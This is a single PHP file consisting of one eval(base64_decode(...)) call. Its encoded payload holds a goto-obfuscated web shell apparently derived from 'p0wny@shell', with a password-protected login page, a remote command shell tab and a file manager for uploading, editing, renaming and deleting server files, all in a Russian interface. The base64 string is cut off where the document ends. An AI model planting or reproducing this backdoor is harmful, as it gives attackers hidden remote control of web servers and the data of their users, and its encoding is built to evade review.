<?php eval(base64_decode('CiBnb3RvIEtWNkJnOyBIdjJMUDogZnVuY3Rpb24gZ2V0QWJzb2x1dGVQYXRoKCRwYXRoLCAkYmFzZURpciA9IG51bGwpIHsgaWYgKGVtcHR5KCRiYXNlRGlyKSkgeyAkYmFzZURpciA9IGdldGN3ZCgpOyB9IGlmIChzdHJwb3MoJHBhdGgsICJceDJmIikgPT09IDApIHsgcmV0dXJuICRwYXRoOyB9IGlmIChzdHJwb3MoJHBhdGgsICJcMTc2IikgPT09IDApIHsgJGhvbWUgPSBnZXRlbnYoIlx4NDhceDRmXDExNVx4NDUiKTsgaWYgKCRob21lKSB7IHJldHVybiAkaG9tZSAuIHN1YnN0cigkcGF0aCwgMSk7IH0gfSByZXR1cm4gcnRyaW0oJGJhc2VEaXIsICJceDJmIikgLiAiXHgyZiIgLiBsdHJpbSgkcGF0aCwgIlx4MmYiKTsgfSBnb3RvIGtfTTJyOyBEWm5CMzogZnVuY3Rpb24gYWxsRnVuY3Rpb25FeGlzdCgkbGlzdCA9IGFycmF5KCkpIHsgZm9yZWFjaCAoJGxpc3QgYXMgJGVudHJ5KSB7IGlmICghZnVuY3Rpb25fZXhpc3RzKCRlbnRyeSkpIHsgcmV0dXJuIGZhbHNlOyB9IH0gcmV0dXJuIHRydWU7IH0gZ290byBVZ1RwNzsgSGI5MEQ6IGlmICghaXNzZXQoJF9TRVNTSU9OWyJceDYxXHg3NVwxNjRceDY4XDE0NVwxNTZcMTY0XHg2OVx4NjNceDYxXDE2NFwxNDVcMTQ0Il0pIHx8ICRfU0VTU0lPTlsiXDE0MVx4NzVcMTY0XHg2OFx4NjVcMTU2XDE2NFx4NjlceDYzXDE0MVwxNjRcMTQ1XHg2NCJdICE9PSB0cnVlKSB7IGlmIChpc3NldCgkX1BPU1RbIlwxNjBceDYxXHg3M1x4NzNcMTY3XDE1N1x4NzJcMTQ0Il0pKSB7IGlmICgkX1BPU1RbIlx4NzBceDYxXDE2M1wxNjNceDc3XHg2Zlx4NzJcMTQ0Il0gPT09IFNIRUxMX1BBU1NXT1JEKSB7ICRfU0VTU0lPTlsiXDE0MVwxNjVceDc0XHg2OFwxNDVceDZlXHg3NFwxNTFcMTQzXHg2MVx4NzRceDY1XDE0NCJdID0gdHJ1ZTsgaGVhZGVyKCJcMTE0XHg2Zlx4NjNceDYxXDE2NFwxNTFceDZmXDE1Nlw3Mlx4MjAiIC4gJF9TRVJWRVJbIlwxMjBcMTEwXHg1MFx4NWZcMTIzXHg0NVwxMTRcMTA2Il0pOyBkaWU7IH0gZWxzZSB7ICRlcnJvciA9ICJceGQwXDIzNVx4ZDBceGI1XHhkMFx4YjJcMzIwXDI2NVwzMjFcMjAwXHhkMFx4YmRcMzIxXHg4YlwzMjBcMjcxXHgyMFwzMjBcMjc3XHhkMFwyNjBceGQxXDIwMFwzMjBceGJlXDMyMFx4YmJceGQxXHg4YyI7IH0gfSA/Pgo8IWRvY3R5cGVodG1sPjxodG1sPjxoZWFkPjxtZXRhIGNoYXJzZXQ9IlVURi04Ij48dGl0bGU+0JDQstGC0L7RgNC40LfQsNGG0LjRjzwvdGl0bGU+PHN0eWxlPmJvZHl7YmFja2dyb3VuZDpsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCMxYTFhMWEgMCwjMmQyZDJkIDEwMCUpO2NvbG9yOiNmZmY7Zm9udC1mYW1pbHk6bW9ub3NwYWNlO2Rpc3BsYXk6ZmxleDtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyO2FsaWduLWl0ZW1zOmNlbnRlcjtoZWlnaHQ6MTAwdmg7bWFyZ2luOjB9LmxvZ2luLWJveHtiYWNrZ3JvdW5kOnJnYmEoMzAsMzAsMzAsLjk1KTtwYWRkaW5nOjQwcHg7Ym9yZGVyLXJhZGl1czoxMnB4O2JveC1zaGFkb3c6MCAxMHB4IDMwcHggcmdiYSgwLDAsMCwuNSk7Ym9yZGVyOjFweCBzb2xpZCAjNDQ0O3RleHQtYWxpZ246Y2VudGVyO3dpZHRoOjM1MHB4fS5sb2dpbi1ib3ggaDJ7Y29sb3I6Izc1ZGYwYjttYXJnaW4tYm90dG9tOjMwcHg7Zm9udC1zaXplOjI0cHh9aW5wdXRbdHlwZT1wYXNzd29yZF17YmFja2dyb3VuZDojMWExYTFhO2JvcmRlcjoxcHggc29saWQgIzQ0NDtjb2xvcjojZmZmO3BhZGRpbmc6MTJweDt3aWR0aDoxMDAlO2JvcmRlci1yYWRpdXM6NnB4O2ZvbnQtc2l6ZToxNnB4O21hcmdpbi1ib3R0b206MjBweDtvdXRsaW5lOjA7dHJhbnNpdGlvbjpib3JkZXItY29sb3IgLjNzO2ZvbnQtZmFtaWx5Om1vbm9zcGFjZX1pbnB1dFt0eXBlPXBhc3N3b3JkXTpmb2N1c3tib3JkZXItY29sb3I6Izc1ZGYwYn1idXR0b257YmFja2dyb3VuZDojNzVkZjBiO2JvcmRlcjpub25lO2NvbG9yOiMwMDA7cGFkZGluZzoxMnB4IDMwcHg7Ym9yZGVyLXJhZGl1czo2cHg7Y3Vyc29yOnBvaW50ZXI7Zm9udC13ZWlnaHQ6NzAwO2ZvbnQtc2l6ZToxNnB4O3dpZHRoOjEwMCU7dHJhbnNpdGlvbjpiYWNrZ3JvdW5kIC4zcztmb250LWZhbWlseTptb25vc3BhY2V9YnV0dG9uOmhvdmVye2JhY2tncm91bmQ6Izg1ZWYxYn0uZXJyb3J7Y29sb3I6I2ZmNDE4MDttYXJnaW4tYm90dG9tOjE1cHg7Zm9udC1zaXplOjE0cHh9PC9zdHlsZT48L2hlYWQ+PGJvZHk+PGRpdiBjbGFzcz0ibG9naW4tYm94Ij48P3BocCAgaWYgKGlzc2V0KCRlcnJvcikpIHsgPz4KPGRpdiBjbGFzcz0iZXJyb3IiPjw/cGhwICBlY2hvIGh0bWxzcGVjaWFsY2hhcnMoJGVycm9yKTsgPz4KPC9kaXY+PD9waHAgIH0gPz4KPGZvcm0gbWV0aG9kPSJwb3N0Ij48aW5wdXQgcGxhY2Vob2xkZXI9ItCS0LLQtdC00LjRgtC1INC/0LDRgNC+0LvRjCJhdXRvZm9jdXMgbmFtZT0icGFzc3dvcmQicmVxdWlyZWQgdHlwZT0icGFzc3dvcmQiPiA8YnV0dG9uIHR5cGU9InN1Ym1pdCI+0JLQvtC50YLQuDwvYnV0dG9uPjwvZm9ybT48L2Rpdj48L2JvZHk+PC9odG1sPjw/cGhwICBkaWU7IH0gZ290byBxTmZsajsgbWxTc3Y6IGZ1bmN0aW9uIGZlYXR1cmVGaWxlQ3JlYXRlKCRwYXRoKSB7ICRzdWNjZXNzID0gQHRvdWNoKCRwYXRoKTsgcmV0dXJuIGFycmF5KCJceDczXHg3NVwxNDNcMTQzXDE0NVx4NzNcMTYzIiA9PiAkc3VjY2Vzcyk7IH0gZ290byBsRllaMDsgbkd5SHg6ID8+CjwhZG9jdHlwZWh0bWw+PGh0bWw+PGhlYWQ+PG1ldGEgY2hhcnNldD0iVVRGLTgiPjx0aXRsZT5wMHdueUBzaGVsbDp+IzwvdGl0bGU+PG1ldGEgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLGluaXRpYWwtc2NhbGU9MSJuYW1lPSJ2aWV3cG9ydCI+PHN0eWxlPip7Ym94LXNpemluZzpib3JkZXItYm94O21hcmdpbjowO3BhZGRpbmc6MH1ib2R5e2JhY2tncm91bmQ6bGluZWFyLWdyYWRpZW50KDEzNWRlZywjMWExYTFhIDAsIzJkMmQyZCAxMDAlKTtjb2xvcjojZWVlO2ZvbnQtZmFtaWx5Om1vbm9zcGFjZTttaW4taGVpZ2h0OjEwMHZoO3BhZGRpbmc6MjBweDtkaXNwbGF5OmZsZXg7ZmxleC1kaXJlY3Rpb246Y29sdW1uO2FsaWduLWl0ZW1zOmNlbnRlcn0uY29udGFpbmVye3dpZHRoOjEwMCU7bWF4LXdpZHRoOjE0MDBweDtiYWNrZ3JvdW5kOnJnYmEoMzAsMzAsMzAsLjk1KTtib3JkZXItcmFkaXVzOjEycHg7Ym94LXNoYWRvdzowIDEwcHggMzBweCByZ2JhKDAsMCwwLC41KTtvdmVyZmxvdzpoaWRkZW47Ym9yZGVyOjFweCBzb2xpZCAjNDQ0O2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47aGVpZ2h0Ojkwdmh9LmhlYWRlcntiYWNrZ3JvdW5kOmxpbmVhci1ncmFkaWVudCh0byByaWdodCwjMjIyLCMzMzMpO3BhZGRpbmc6MTVweCAyNXB4O2JvcmRlci1ib3R0b206MnB4IHNvbGlkICM3NWRmMGI7ZGlzcGxheTpmbGV4O2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuO2FsaWduLWl0ZW1zOmNlbnRlcn0ubG9nb3tmb250LXNpemU6MThweDtmb250LXdlaWdodDo3MDA7Y29sb3I6Izc1ZGYwYn0ubG9nb3V0LWJ0bntiYWNrZ3JvdW5kOiNmZjQxODA7Y29sb3I6I2ZmZjtib3JkZXI6bm9uZTtwYWRkaW5nOjhweCAxNnB4O2JvcmRlci1yYWRpdXM6NHB4O2N1cnNvcjpwb2ludGVyO2ZvbnQtc2l6ZToxNHB4O3RyYW5zaXRpb246YmFja2dyb3VuZCAuM3N9LmxvZ291dC1idG46aG92ZXJ7YmFja2dyb3VuZDojZTUzOTcwfS50YWJze2Rpc3BsYXk6ZmxleDtiYWNrZ3JvdW5kOiMyNTI1MjU7Ym9yZGVyLWJvdHRvbToxcHggc29saWQgIzQ0NH0udGFie3BhZGRpbmc6MTVweCAzMHB4O2N1cnNvcjpwb2ludGVyO2JhY2tncm91bmQ6MCAwO2JvcmRlcjpub25lO2NvbG9yOiNhYWE7Zm9udC1zaXplOjE2cHg7Ym9yZGVyLXJpZ2h0OjFweCBzb2xpZCAjMzMzO3RyYW5zaXRpb246YWxsIC4zc30udGFiOmhvdmVye2JhY2tncm91bmQ6IzMzMztjb2xvcjojZmZmfS50YWIuYWN0aXZle2JhY2tncm91bmQ6IzFhMWExYTtjb2xvcjojNzVkZjBiO2JvcmRlci1ib3R0b206M3B4IHNvbGlkICM3NWRmMGJ9LnRhYi1jb250ZW50e2Rpc3BsYXk6bm9uZTtmbGV4OjE7b3ZlcmZsb3c6aGlkZGVufS50YWItY29udGVudC5hY3RpdmV7ZGlzcGxheTpmbGV4O2ZsZXgtZGlyZWN0aW9uOmNvbHVtbn0jc2hlbGx7YmFja2dyb3VuZDojMDAwO2NvbG9yOiNlMGUwZTA7Zm9udC1zaXplOjEzcHg7bGluZS1oZWlnaHQ6MS40O2ZsZXg6MTtvdmVyZmxvdzphdXRvO3BhZGRpbmc6MTBweDtkaXNwbGF5OmZsZXg7ZmxleC1kaXJlY3Rpb246Y29sdW1ufSNzaGVsbC1jb250ZW50e2ZsZXg6MTtvdmVyZmxvdy15OmF1dG87d2hpdGUtc3BhY2U6cHJlLXdyYXA7d29yZC1icmVhazpicmVhay1hbGx9LnNoZWxsLXByb21wdHtjb2xvcjojNzVkZjBiO2ZvbnQtd2VpZ2h0OjcwMH0uc2hlbGwtcHJvbXB0IHNwYW57Y29sb3I6IzFiYzllN30uc2hlbGwtbGluZXttYXJnaW4tYm90dG9tOjVweH0uc2hlbGwtaW5wdXQtbGluZXtkaXNwbGF5OmZsZXg7YWxpZ24taXRlbXM6ZmxleC1zdGFydH0uc2hlbGwtaW5wdXR7YmFja2dyb3VuZDowIDA7Ym9yZGVyOm5vbmU7Y29sb3I6I2ZmZjtmb250LXNpemU6MTNweDtvdXRsaW5lOjA7ZmxleDoxO2NhcmV0LWNvbG9yOiM3NWRmMGI7d2hpdGUtc3BhY2U6cHJlO292ZXJmbG93OmhpZGRlbn0jZmlsZW1hbmFnZXJ7ZmxleDoxO2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47b3ZlcmZsb3c6aGlkZGVufS5mbS1oZWFkZXJ7ZGlzcGxheTpmbGV4O2dhcDoxMHB4O3BhZGRpbmc6MTVweDtiYWNrZ3JvdW5kOiMyNTI1MjU7YWxpZ24taXRlbXM6Y2VudGVyO2JvcmRlci1ib3R0b206MXB4IHNvbGlkICM0NDR9LmZtLXBhdGh7ZmxleDoxO2JhY2tncm91bmQ6IzFhMWExYTtib3JkZXI6MXB4IHNvbGlkICM0NDQ7Y29sb3I6I2ZmZjtwYWRkaW5nOjhweCAxMnB4O2JvcmRlci1yYWRpdXM6NHB4O2ZvbnQtc2l6ZToxM3B4fS5mbS1nby1idG57YmFja2dyb3VuZDojNzVkZjBiO2NvbG9yOiMwMDA7Ym9yZGVyOjFweCBzb2xpZCAjNjVjZjAwO3BhZGRpbmc6OHB4IDE2cHg7Ym9yZGVyLXJhZGl1czo0cHg7Y3Vyc29yOnBvaW50ZXI7Zm9udC1zaXplOjEzcHg7dHJhbnNpdGlvbjpiYWNrZ3JvdW5kIC4yczt3aGl0ZS1zcGFjZTpub3dyYXB9LmZtLWdvLWJ0bjpob3ZlcntiYWNrZ3JvdW5kOiM4NWVmMWJ9LmZtLWJ0bntiYWNrZ3JvdW5kOiMzMzM7Y29sb3I6I2ZmZjtib3JkZXI6MXB4IHNvbGlkICM0NDQ7cGFkZGluZzo4cHggMTZweDtib3JkZXItcmFkaXVzOjRweDtjdXJzb3I6cG9pbnRlcjtmb250LXNpemU6MTNweDt0cmFuc2l0aW9uOmJhY2tncm91bmQgLjJzO3doaXRlLXNwYWNlOm5vd3JhcH0uZm0tYnRuOmhvdmVye2JhY2tncm91bmQ6IzQ0NH0uZm0tYnRuLnByaW1hcnl7YmFja2dyb3VuZDojNzVkZjBiO2NvbG9yOiMwMDA7Ym9yZGVyLWNvbG9yOiM2NWNmMDB9LmZtLWJ0bi5wcmltYXJ5OmhvdmVye2JhY2tncm91bmQ6Izg1ZWYxYn0uZm0tYnRuLmRhbmdlcntiYWNrZ3JvdW5kOiNmZjQxODA7Y29sb3I6I2ZmZjtib3JkZXItY29sb3I6I2U1Mzk3MH0uZm0tYnRuLmRhbmdlcjpob3ZlcntiYWNrZ3JvdW5kOiNmZjUyOTB9I2ZtLWNvbnRlbnR7ZmxleDoxO292ZXJmbG93LXk6YXV0bztiYWNrZ3JvdW5kOiMxYTFhMWF9LmZtLXRhYmxle3dpZHRoOjEwMCU7Ym9yZGVyLWNvbGxhcHNlOmNvbGxhcHNlfS5mbS10YWJsZSB0aHtiYWNrZ3JvdW5kOiMyNTI1MjU7cGFkZGluZzoxMnB4IDE1cHg7dGV4dC1hbGlnbjpsZWZ0O2JvcmRlci1ib3R0b206MnB4IHNvbGlkICMzMzM7Y29sb3I6Izc1ZGYwYjtmb250LXdlaWdodDo2MDA7cG9zaXRpb246c3RpY2t5O3RvcDowO3VzZXItc2VsZWN0Om5vbmV9LmZtLXRhYmxlIHRke3BhZGRpbmc6MTBweCAxNXB4O2JvcmRlci1ib3R0b206MXB4IHNvbGlkICMzMzM7Zm9udC1zaXplOjEzcHg7Y3Vyc29yOnBvaW50ZXI7dXNlci1zZWxlY3Q6bm9uZX0uZm0tdGFibGUgdHI6aG92ZXJ7YmFja2dyb3VuZDpyZ2JhKDExNywyMjMsMTEsLjEpfS5mbS10YWJsZSB0ci5zZWxlY3RlZHtiYWNrZ3JvdW5kOnJnYmEoMTE3LDIyMywxMSwuMil9LmZpbGUtYWN0aW9uc3tkaXNwbGF5OmZsZXg7Z2FwOjVweH0uYWN0aW9uLWJ0bntiYWNrZ3JvdW5kOiMzMzM7Ym9yZGVyOm5vbmU7Y29sb3I6I2ZmZjtwYWRkaW5nOjRweCA4cHg7Ym9yZGVyLXJhZGl1czozcHg7Y3Vyc29yOnBvaW50ZXI7Zm9udC1zaXplOjExcHg7dHJhbnNpdGlvbjpiYWNrZ3JvdW5kIC4yczt6LWluZGV4OjI7cG9zaXRpb246cmVsYXRpdmV9LmFjdGlvbi1idG46aG92ZXJ7YmFja2dyb3VuZDojNDQ0fS5hY3Rpb24tYnRuLmRvd25sb2Fke2JhY2tncm91bmQ6IzFiYzllNztjb2xvcjojMDAwfS5hY3Rpb24tYnRuLmVkaXR7YmFja2dyb3VuZDojZmZhNzI2O2NvbG9yOiMwMDB9LmFjdGlvbi1idG4uZGVsZXRle2JhY2tncm91bmQ6I2ZmNDE4MDtjb2xvcjojZmZmfS5tb2RhbHtkaXNwbGF5Om5vbmU7cG9zaXRpb246Zml4ZWQ7dG9wOjA7bGVmdDowO3dpZHRoOjEwMCU7aGVpZ2h0OjEwMCU7YmFja2dyb3VuZDpyZ2JhKDAsMCwwLC44KTt6LWluZGV4OjEwMDA7YWxpZ24taXRlbXM6Y2VudGVyO2p1c3RpZnktY29udGVudDpjZW50ZXJ9Lm1vZGFsLWNvbnRlbnR7YmFja2dyb3VuZDojMjUyNTI1O3BhZGRpbmc6MzBweDtib3JkZXItcmFkaXVzOjhweDttaW4td2lkdGg6NTAwcHg7bWF4LXdpZHRoOjkwJTtib3JkZXI6MXB4IHNvbGlkICM0NDQ7bWF4LWhlaWdodDo4MHZoO292ZXJmbG93LXk6YXV0b30ubW9kYWwgaDN7Y29sb3I6Izc1ZGYwYjttYXJnaW4tYm90dG9tOjIwcHg7Zm9udC1zaXplOjE4cHh9Lm1vZGFsIGlucHV0LC5tb2RhbCB0ZXh0YXJlYXt3aWR0aDoxMDAlO3BhZGRpbmc6MTBweDttYXJnaW4tYm90dG9tOjE1cHg7YmFja2dyb3VuZDojMWExYTFhO2JvcmRlcjoxcHggc29saWQgIzQ0NDtjb2xvcjojZmZmO2JvcmRlci1yYWRpdXM6NHB4O3Jlc2l6ZTp2ZXJ0aWNhbH0ubW9kYWwgdGV4dGFyZWF7bWluLWhlaWdodDo0MDBweDtmb250LWZhbWlseTptb25vc3BhY2U7Zm9udC1zaXplOjEzcHh9Lm1vZGFsLWJ1dHRvbnN7ZGlzcGxheTpmbGV4O2dhcDoxMHB4O2p1c3RpZnktY29udGVudDpmbGV4LWVuZH06Oi13ZWJraXQtc2Nyb2xsYmFye3dpZHRoOjEwcHg7aGVpZ2h0OjEwcHh9Ojotd2Via2l0LXNjcm9sbGJhci10cmFja3tiYWNrZ3JvdW5kOiMxYTFhMWE7Ym9yZGVyLXJhZGl1czo1cHh9Ojotd2Via2l0LXNjcm9sbGJhci10aHVtYntiYWNrZ3JvdW5kOiM0NDQ7Ym9yZGVyLXJhZGl1czo1cHh9Ojotd2Via2l0LXNjcm9sbGJhci10aHVtYjpob3ZlcntiYWNrZ3JvdW5kOiM1NTV9LnNpemUtYmFkZ2V7YmFja2dyb3VuZDojMzMzO3BhZGRpbmc6MnB4IDZweDtib3JkZXItcmFkaXVzOjNweDtmb250LXNpemU6MTFweH0ucGVybXMtYmFkZ2V7YmFja2dyb3VuZDojMWExYTFhO3BhZGRpbmc6MnB4IDZweDtib3JkZXItcmFkaXVzOjNweDtmb250LXNpemU6MTFweH1Aa2V5ZnJhbWVzIGZhZGVJbntmcm9te29wYWNpdHk6MDt0cmFuc2Zvcm06dHJhbnNsYXRlWSgtMTBweCl9dG97b3BhY2l0eToxO3RyYW5zZm9ybTp0cmFuc2xhdGVZKDApfX0uZmFkZS1pbnthbmltYXRpb246ZmFkZUluIC4zcyBlYXNlLW91dH0uYmxpbmt7YW5pbWF0aW9uOmJsaW5rIDFzIGluZmluaXRlfUBrZXlmcmFtZXMgYmxpbmt7MCUsNTAle29wYWNpdHk6MX0xMDAlLDUxJXtvcGFjaXR5OjB9fS5kaXI6YmVmb3Jle2NvbnRlbnQ6IvCfk4EgIn0uZmlsZTpiZWZvcmV7Y29udGVudDoi8J+ThCAifTwvc3R5bGU+PC9oZWFkPjxib2R5PjxkaXYgY2xhc3M9ImNvbnRhaW5lciBmYWRlLWluIj48ZGl2IGNsYXNzPSJoZWFkZXIiPjxkaXYgY2xhc3M9ImxvZ28iPnAwd255QHNoZWxsOn4jPC9kaXY+PGJ1dHRvbiBjbGFzcz0ibG9nb3V0LWJ0biJvbmNsaWNrPSJsb2dvdXQoKSI+0JLRi9GF0L7QtDwvYnV0dG9uPjwvZGl2PjxkaXYgY2xhc3M9InRhYnMiPjxidXR0b24gY2xhc3M9ImFjdGl2ZSB0YWIib25jbGljaz0nc3dpdGNoVGFiKCJzaGVsbCIpJz5TaGVsbDwvYnV0dG9uPiA8YnV0dG9uIGNsYXNzPSJ0YWIib25jbGljaz0nc3dpdGNoVGFiKCJmaWxlbWFuYWdlciIpJz5GaWxlIE1hbmFnZXI8L2J1dHRvbj48L2Rpdj48ZGl2IGNsYXNzPSJhY3RpdmUgdGFiLWNvbnRlbnQiaWQ9InNoZWxsLXRhYiI+PGRpdiBpZD0ic2hlbGwiPjxkaXYgaWQ9InNoZWxsLWNvbnRlbnQiPjwvZGl2PjwvZGl2PjwvZGl2PjxkaXYgY2xhc3M9InRhYi1jb250ZW50ImlkPSJmaWxlbWFuYWdlci10YWIiPjxkaXYgaWQ9ImZpbGVtYW5hZ2VyIj48ZGl2IGNsYXNzPSJmbS1oZWFkZXIiPjxpbnB1dCBpZD0iZm0tcGF0aC1pbnB1dCJwbGFjZWhvbGRlcj0iL3BhdGgvdG8vZGlyZWN0b3J5ImNsYXNzPSJmbS1wYXRoInZhbHVlPSIvIj4gPGJ1dHRvbiBjbGFzcz0iZm0tZ28tYnRuIm9uY2xpY2s9ImdvVG9QYXRoKCkiPtCf0LXRgNC10LnRgtC4PC9idXR0b24+IDxidXR0b24gY2xhc3M9ImZtLWJ0biJvbmNsaWNrPSJmbVJlZnJlc2goKSI+0J7QsdC90L7QstC40YLRjDwvYnV0dG9uPiA8YnV0dG9uIGNsYXNzPSJmbS1idG4ib25jbGljaz0iZm1Hb1VwKCkiPtCd0LDQstC10YDRhTwvYnV0dG9uPiA8YnV0dG9uIGNsYXNzPSJmbS1idG4gcHJpbWFyeSJvbmNsaWNrPSdzaG93TW9kYWwoInVwbG9hZCIpJz7Ql9Cw0LPRgNGD0LfQuNGC0Yw8L2J1dHRvbj4gPGJ1dHRvbiBjbGFzcz0iZm0tYnRuIm9uY2xpY2s9J3Nob3dNb2RhbCgiY3JlYXRlRmlsZSIpJz7QpNCw0LnQuzwvYnV0dG9uPiA8YnV0dG9uIGNsYXNzPSJmbS1idG4ib25jbGljaz0nc2hvd01vZGFsKCJjcmVhdGVEaXIiKSc+0J/QsNC/0LrQsDwvYnV0dG9uPjwvZGl2PjxkaXYgaWQ9ImZtLWNvbnRlbnQiPjx0YWJsZSBjbGFzcz0iZm0tdGFibGUiPjx0aGVhZD48dHI+PHRoIHdpZHRoPSI0MCUiPtCY0LzRjzwvdGg+PHRoIHdpZHRoPSIxNSUiPtCg0LDQt9C80LXRgDwvdGg+PHRoIHdpZHRoPSIxNSUiPtCf0YDQsNCy0LA8L3RoPjx0aCB3aWR0aD0iMjAlIj7QmNC30LzQtdC90LXQvTwvdGg+PHRoIHdpZHRoPSIxMCUiPtCU0LXQudGB0YLQstC40Y88L3RoPjwvdHI+PC90aGVhZD48dGJvZHkgaWQ9ImZtLWZpbGVzIj48L3Rib2R5PjwvdGFibGU+PC9kaXY+PC9kaXY+PC9kaXY+PC9kaXY+PGRpdiBjbGFzcz0ibW9kYWwiaWQ9InVwbG9hZE1vZGFsIj48ZGl2IGNsYXNzPSJtb2RhbC1jb250ZW50Ij48aDM+0JfQsNCz0YDRg9C30LrQsCDRhNCw0LnQu9CwPC9oMz48aW5wdXQgaWQ9ImZpbGVUb1VwbG9hZCJ0eXBlPSJmaWxlIj4gPGlucHV0IGlkPSJ1cGxvYWRQYXRoInBsYWNlaG9sZGVyPSLQn9GD0YLRjCAo0L7RgdGC0LDQstGM0YLQtSDQv9GD0YHRgtGL0Lwg0LTQu9GPINGC0LXQutGD0YnQtdC5INC/0LDQv9C60LgpIj48ZGl2IGNsYXNzPSJtb2RhbC1idXR0b25zIj48YnV0dG9uIGNsYXNzPSJmbS1idG4ib25jbGljaz0naGlkZU1vZGFsKCJ1cGxvYWQiKSc+0J7RgtC80LXQvdCwPC9idXR0b24+IDxidXR0b24gY2xhc3M9ImZtLWJ0biBwcmltYXJ5Im9uY2xpY2s9InVwbG9hZEZpbGUoKSI+0JfQsNCz0YDRg9C30LjRgtGMPC9idXR0b24+PC9kaXY+PC9kaXY+PC9kaXY+PGRpdiBjbGFzcz0ibW9kYWwiaWQ9ImNyZWF0ZUZpbGVNb2RhbCI+PGRpdiBjbGFzcz0ibW9kYWwtY29udGVudCI+PGgzPtCh0L7Qt9C00LDRgtGMINGE0LDQudC7PC9oMz48aW5wdXQgaWQ9Im5ld0ZpbGVOYW1lInBsYWNlaG9sZGVyPSLQmNC80Y8g0YTQsNC50LvQsCI+PGRpdiBjbGFzcz0ibW9kYWwtYnV0dG9ucyI+PGJ1dHRvbiBjbGFzcz0iZm0tYnRuIm9uY2xpY2s9J2hpZGVNb2RhbCgiY3JlYXRlRmlsZSIpJz7QntGC0LzQtdC90LA8L2J1dHRvbj4gPGJ1dHRvbiBjbGFzcz0iZm0tYnRuIHByaW1hcnkib25jbGljaz0iY3JlYXRlRmlsZSgpIj7QodC+0LfQtNCw0YLRjDwvYnV0dG9uPjwvZGl2PjwvZGl2PjwvZGl2PjxkaXYgY2xhc3M9Im1vZGFsImlkPSJjcmVhdGVEaXJNb2RhbCI+PGRpdiBjbGFzcz0ibW9kYWwtY29udGVudCI+PGgzPtCh0L7Qt9C00LDRgtGMINC/0LDQv9C60YM8L2gzPjxpbnB1dCBpZD0ibmV3RGlyTmFtZSJwbGFjZWhvbGRlcj0i0JjQvNGPINC/0LDQv9C60LgiPjxkaXYgY2xhc3M9Im1vZGFsLWJ1dHRvbnMiPjxidXR0b24gY2xhc3M9ImZtLWJ0biJvbmNsaWNrPSdoaWRlTW9kYWwoImNyZWF0ZURpciIpJz7QntGC0LzQtdC90LA8L2J1dHRvbj4gPGJ1dHRvbiBjbGFzcz0iZm0tYnRuIHByaW1hcnkib25jbGljaz0iY3JlYXRlRGlyKCkiPtCh0L7Qt9C00LDRgtGMPC9idXR0b24+PC9kaXY+PC9kaXY+PC9kaXY+PGRpdiBjbGFzcz0ibW9kYWwiaWQ9InJlbmFtZU1vZGFsIj48ZGl2IGNsYXNzPSJtb2RhbC1jb250ZW50Ij48aDM+0J/QtdGA0LXQuNC80LXQvdC+0LLQsNGC0Yw8L2gzPjxpbnB1dCBpZD0icmVuYW1lT2xkInBsYWNlaG9sZGVyPSLQodGC0LDRgNC+0LUg0LjQvNGPInJlYWRvbmx5PiA8aW5wdXQgaWQ9InJlbmFtZU5ldyJwbGFjZWhvbGRlcj0i0J3QvtCy0L7QtSDQuNC80Y8iPjxkaXYgY2xhc3M9Im1vZGFsLWJ1dHRvbnMiPjxidXR0b24gY2xhc3M9ImZtLWJ0biJvbmNsaWNrPSdoaWRlTW9kYWwoInJlbmFtZSIpJz7QntGC0LzQtdC90LA8L2J1dHRvbj4gPGJ1dHRvbiBjbGFzcz0iZm0tYnRuIHByaW1hcnkib25jbGljaz0icmVuYW1lRmlsZSgpIj7Qn9C10YDQtdC40LzQtdC90L7QstCw0YLRjDwvYnV0dG9uPjwvZGl2PjwvZGl2PjwvZGl2PjxkaXYgY2xhc3M9Im1vZGFsImlkPSJlZGl0RmlsZU1vZGFsIj48ZGl2IGNsYXNzPSJtb2RhbC1jb250ZW50Ij48aDM+0KDQtdC00LDQutGC0LjRgNC+0LLQsNGC0Ywg0YTQsNC50Ls8L2gzPjxpbnB1dCBpZD0iZWRpdEZpbGVOYW1lInJlYWRvbmx5PiA8dGV4dGFyZWEgaWQ9ImVkaXRGaWxlQ29udGVudCJwbGFjZWhvbGRlcj0i0KHQvtC00LXRgNC20LjQvNC+0LUg0YTQsNC50LvQsCI+PC90ZXh0YXJlYT48ZGl2IGNsYXNzPSJtb2RhbC1idXR0b25zIj48YnV0dG9uIGNsYXNzPSJmbS1idG4ib25jbGljaz0naGlkZU1vZGFsKCJlZGl0RmlsZSIpJz7QntGC0LzQtdC90LA8L2J1dHRvbj4gPGJ1dHRvbiBjbGFzcz0iZm0tYnRuIHByaW1hcnkib25jbGljaz0ic2F2ZUZpbGUoKSI+0KHQvtGF0YDQsNC90LjRgtGMPC9idXR0b24+PC9kaXY+PC9kaXY+PC9kaXY+PHNjcmlwdD4vLyDQk9C70L7QsdCw0LvRjNC90YvQtSDQv9C10YDQtdC80LXQvdC90YvQtQogICAgICAgIHZhciBTSEVMTF9DT05GSUcgPTw/cGhwICBnb3RvIFhab0hGOyBJSnFxUzogZnVuY3Rpb24gZXhwYW5kUGF0aCgkcGF0aCkgeyBpZiAocHJlZ19tYXRjaCgiXHgyM1x4NWVcNTBcMTc2XHg1YlwxNDFceDJkXHg3YVx4NDFceDJkXHg1YVw2MFx4MmRceDM5XHg1Zlw1Nlx4MmRcMTM1XHgyYVx4MjlceDI4XDU3XHgyZVw1Mlx4MjlceDNmXHgyNFx4MjMiLCAkcGF0aCwgJG1hdGNoKSkgeyBleGVjKCJceDY1XHg2M1wxNTBceDZmXHgyMHskbWF0Y2hbIlx4MzEiXX0iLCAkc3Rkb3V0KTsgcmV0dXJuICRzdGRvdXRbMF0gLiAkbWF0Y2hbMl07IH0gcmV0dXJuICRwYXRoOyB9IGdvdG8gRFpuQjM7IGVnaUtQOiBmdW5jdGlvbiBmZWF0dXJlUHdkKCkgeyByZXR1cm4gYXJyYXkoIlwxNDNceDc3XDE0NCIgPT4gYmFzZTY0X2VuY29kZShnZXRjd2QoKSkpOyB9IGdvdG8gRDVQbzM7IEdSUVFZOiBmdW5jdGlvbiBmZWF0dXJlRmlsZVJlbmFtZSgkb2xkLCAkbmV3KSB7IHJldHVybiBhcnJheSgiXDE2M1x4NzVcMTQzXHg2M1x4NjVceDczXDE2M